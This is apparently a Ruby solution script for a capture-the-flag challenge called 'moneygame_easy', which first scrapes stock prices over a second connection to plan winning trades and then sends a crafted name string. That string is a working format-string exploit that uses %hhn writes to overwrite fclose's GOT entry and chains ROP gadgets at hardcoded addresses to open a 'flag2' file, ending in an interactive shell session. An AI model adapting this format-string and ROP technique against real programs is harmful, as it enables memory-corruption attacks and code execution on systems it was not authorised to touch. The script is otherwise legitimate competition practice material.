#!/usr/bin/env ruby

require './ctfutils'

if $prod
  pipe = TCPSocket.open('pwn1.chal.mmactf.link', 21345)
  pipe2 = TCPSocket.open('pwn1.chal.mmactf.link', 21345)
else
  pipe = popen('./moneygame_easy')
  pipe2 = popen('./moneygame_easy')
end

log = []
54.times{
  s = []
  while true
    l = pipe2.get
    if l =~ /Stock #(\d): \$(\d+)\.(\d+)/
      s[$1.to_i-1] = $2.to_i * 100 + $3.to_i
      if $1.to_i == 3
        break
      end
    end
  end
  log << s
  pipe2.puts 'Rest'
}

pipe2.close

strats = []
53.times{|w|
  1.upto(53) do |t|
    break if !log[w+t]

    prev = log[w]
    now = log[w+t]

    3.times{|i|
      if now[i] > prev[i]
        d = (now[i].to_f / prev[i] - 1.0) / (t + 1)
        strats << [d, w, t, i]
      end
    }
  end
}

cmds = [nil] * 54

p strats.size

strats.sort_by!{|d,*_|-d}

strats.each do |d, w, t, i|
  if !cmds[w,t+1].all?{|c|c==nil}
    next
  end

  cmds[w] = ['Buy', i]
  (w+1).upto(w+t-1){|_|cmds[_] = 'Rest'}
  cmds[w+t] = ['Sell', i]
end

money = 1000000
num = 0
cmds.each_with_index do |c, w|
  puts "= week #{w} #{c}"
  if !c || c == 'Rest'
    pipe.puts c
  else
    pipe.puts c[0]
    pipe.puts c[1] + 1
    if c[0] == 'Buy'
      num = money / log[w][c[1]]
      money -= num * log[w][c[1]]
    else
      money += num * log[w][c[1]]
    end
    pipe.puts num
  end
end

puts "Expected: #{money}"

pipe.wait_until(/What your name\? : /)

c = ''

fclose_plt = 0x804a278
fflush_plt = 0x804a270

pop11_addr = 0x08048d59
#pop11_addr = 0xdeadbeef

pop4_addr = 0x08048d5c
#pop4_addr = 0xdeadbeef

call_fopen = 0x8048c61

flag2_addr = 0x0804a168 + 0xdf0
#flag2_addr = 0x804a2b4

pop_addr = 0x080484b5

c = ''

rop = [0xdeadbeea, 0x0804a168 + 0xe00]
rop += [call_fopen, flag2_addr, 0x8048f50]
rop += [0xdeadbeea, 0xdeadbeeb, 0xdeadbeec, 0xdeadbeed] * 2
4.times{
  #rop += [0x8048520, 0x080484b5, 0x08048000 + 2768]
  rop += [0x8048cbc]
}
rps = rop.size

c += rop.pack("L*")
4.times{|i|
  #c += [fflush_plt+i].pack("L*")
  c += [fclose_plt+i].pack("L*")
}
6.times{|i|
  c += [flag2_addr+i].pack("L*")
}

pn = c.size
a = pop11_addr
4.times{|i|
  n = a & 0xff
  c += "%#{(n-pn)%256}c%#{7+rps+i}$hhn"
  a >>= 8
  pn = n
}

#pn = c.size
6.times{|i|
  n = "flag2\0"[i].ord & 0xff
  c += "%#{(n-pn)%256}c%#{7+4+rps+i}$hhn"
  a >>= 8
  pn = n
}

if c.size > 0x100
  puts c.size
  raise c
end

#c += 'X' * 50

if c.include?("\n")
  puts 'fuck'
  raise c
end


pipe.puts c
File.write('rop', "Rest\n"*54+c)

#pipe.close_write

pipe.interactive
